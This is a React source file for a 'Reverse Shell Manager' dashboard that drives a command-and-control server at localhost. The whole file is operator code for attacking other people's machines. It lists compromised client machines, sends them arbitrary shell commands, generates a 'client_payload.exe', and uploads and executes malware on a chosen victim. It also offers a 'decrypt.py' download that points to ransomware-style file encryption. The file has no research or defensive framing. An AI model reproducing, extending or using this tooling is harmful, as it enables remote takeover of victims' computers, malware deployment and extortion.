import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { AppBar, Toolbar, Typography, Button, Container, TextField, Paper, List, ListItem, ListItemText, Tabs, Tab, Box } from '@mui/material';
import { saveAs } from 'file-saver';

const SERVER_URL = 'http://localhost:5000';

const ReverseShellManagement = () => {
  const [clients, setClients] = useState([]);
  const [selectedClient, setSelectedClient] = useState(null);
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState('');
  const [message, setMessage] = useState('');
  const [serverIP, setServerIP] = useState('');
  const [serverPort, setServerPort] = useState('');
  const [malwareFile, setMalwareFile] = useState(null);
  const [tabValue, setTabValue] = useState(0);

  useEffect(() => {
    fetchClients();
  }, []);

  const fetchClients = async () => {
    try {
      const response = await axios.get(`${SERVER_URL}/clients`);
      setClients(response.data.clients);
    } catch (error) {
      console.error('There was an error fetching the clients!', error);
    }
  };

  const handleSendCommand = async () => {
    try {
      const response = await axios.post(`${SERVER_URL}/send_command`, { client_id: selectedClient, command });
      setOutput(response.data.output);
    } catch (error) {
      console.error('There was an error sending the command!', error);
    }
  };

  const handleGeneratePayload = () => {
    axios.get(`${SERVER_URL}/generate_payload`, { responseType: 'blob' })
      .then((response) => {
        const file = new Blob([response.data], { type: 'application/octet-stream' });
        saveAs(file, 'client_payload.exe');
      })
      .catch((error) => {
        console.error('There was an error generating the payload!', error);
      });
  };

  const handleUploadMalware = () => {
    const formData = new FormData();
    formData.append('malware', malwareFile);

    axios.post(`${SERVER_URL}/upload_malware`, formData, {
      headers: {
        'Content-Type': 'multipart/form-data'
      }
    })
      .then((response) => {
        setMessage(response.data.status);
      })
      .catch((error) => {
        console.error('There was an error uploading the malware!', error);
      });
  };

  const handleExecuteMalware = async () => {
    try {
      const malwareName = malwareFile.name;
      const response = await axios.post(`${SERVER_URL}/execute_malware`, { client_id: selectedClient, malware_name: malwareName });
      setOutput(response.data.output);
    } catch (error) {
      console.error('There was an error executing the malware!', error);
    }
  };

  const handleDownloadDecryptScript = () => {
    axios.get(`${SERVER_URL}/download_decrypt_script`, { responseType: 'blob' })
      .then((response) => {
        const file = new Blob([response.data], { type: 'application/octet-stream' });
        saveAs(file, 'decrypt.py');
      })
      .catch((error) => {
        console.error('There was an error downloading the decryption script!', error);
      });
  };

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
  };

  return (
    <div>
      <AppBar position="static" style={{ backgroundColor: 'blue' }}>
        <Toolbar>
          <Typography variant="h6" style={{ flexGrow: 1, color: 'white' }}>Reverse Shell Manager</Typography>
          <Button color="inherit" onClick={fetchClients} style={{ color: 'white' }}>Refresh Clients</Button>
          <Button color="inherit" onClick={handleGeneratePayload} style={{ color: 'white' }}>Generate Payload</Button>
        </Toolbar>
      </AppBar>
      <Container style={{ marginTop: '20px' }}>
        <TextField
          label="Server IP"
          value={serverIP}
          onChange={(e) => setServerIP(e.target.value)}
          fullWidth
          margin="normal"
          InputProps={{ style: { color: 'black', backgroundColor: 'white' } }}
        />
        <TextField
          label="Server Port"
          value={serverPort}
          onChange={(e) => setServerPort(e.target.value)}
          fullWidth
          margin="normal"
          InputProps={{ style: { color: 'black', backgroundColor: 'white' } }}
        />
        <Paper style={{ padding: '20px', marginBottom: '20px', backgroundColor: 'red', color: 'white' }}>
          <Typography variant="h4" gutterBottom>Connected Clients</Typography>
          <List>
            {clients.map((client, index) => (
              <ListItem button key={index} selected={selectedClient === client.id} onClick={() => setSelectedClient(client.id)}>
                <ListItemText primary={`Client ${client.id} (${client.address})`} style={{ color: 'white' }} />
              </ListItem>
            ))}
          </List>
        </Paper>
        <Tabs value={tabValue} onChange={handleTabChange} centered style={{ backgroundColor: 'blue', color: 'white' }}>
          <Tab label="Send Command" style={{ color: 'white' }} />
          <Tab label="Upload Malware" style={{ color: 'white' }} />
          <Tab label="Execute Malware" style={{ color: 'white' }} />
          <Tab label="Decrypt Files" style={{ color: 'white' }} />
        </Tabs>
        <TabPanel value={tabValue} index={0}>
          {selectedClient && (
            <Paper style={{ padding: '20px', marginBottom: '20px', backgroundColor: 'white', color: 'black' }}>
              <Typography variant="h4" gutterBottom>Send Command to Client {selectedClient}</Typography>
              <TextField label="Command" value={command} onChange={(e) => setCommand(e.target.value)} fullWidth margin="normal" />
              <Button variant="contained" style={{ backgroundColor: 'blue', color: 'white' }} onClick={handleSendCommand}>Send</Button>
              <Typography variant="h6" gutterBottom>Output:</Typography>
              <Paper style={{ padding: '10px', backgroundColor: '#f5f5f5' }}>{output}</Paper>
            </Paper>
          )}
        </TabPanel>
        <TabPanel value={tabValue} index={1}>
          <Paper style={{ padding: '20px', marginBottom: '20px', backgroundColor: 'white', color: 'black' }}>
            <Typography variant="h4" gutterBottom>Upload Malware Script</Typography>
            <input type="file" onChange={(e) => setMalwareFile(e.target.files[0])} />
            <Button variant="contained" style={{ backgroundColor: 'blue', color: 'white' }} onClick={handleUploadMalware}>Upload</Button>
          </Paper>
        </TabPanel>
        <TabPanel value={tabValue} index={2}>
          {selectedClient && (
            <Paper style={{ padding: '20px', marginBottom: '20px', backgroundColor: 'white', color: 'black' }}>
              <Typography variant="h4" gutterBottom>Execute Malware on Client {selectedClient}</Typography>
              <Button variant="contained" style={{ backgroundColor: 'blue', color: 'white' }} onClick={handleExecuteMalware}>Execute</Button>
              <Typography variant="h6" gutterBottom>Output:</Typography>
              <Paper style={{ padding: '10px', backgroundColor: '#f5f5f5' }}>{output}</Paper>
            </Paper>
          )}
        </TabPanel>
        <TabPanel value={tabValue} index={3}>
          <Paper style={{ padding: '20px', marginBottom: '20px', backgroundColor: 'white', color: 'black' }}>
            <Typography variant="h4" gutterBottom>Download Decrypt Script</Typography>
            <Button variant="contained" style={{ backgroundColor: 'blue', color: 'white' }} onClick={handleDownloadDecryptScript}>Download</Button>
          </Paper>
        </TabPanel>
        {message && <Typography variant="body1" color="textSecondary">{message}</Typography>}
      </Container>
    </div>
  );
}

const TabPanel = (props) => {
  const { children, value, index, ...other } = props;
  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`tabpanel-${index}`}
      aria-labelledby={`tab-${index}`}
      {...other}
    >
      {value === index && (
        <Box p={3}>
          {children}
        </Box>
      )}
    </div>
  );
}

export default ReverseShellManagement;
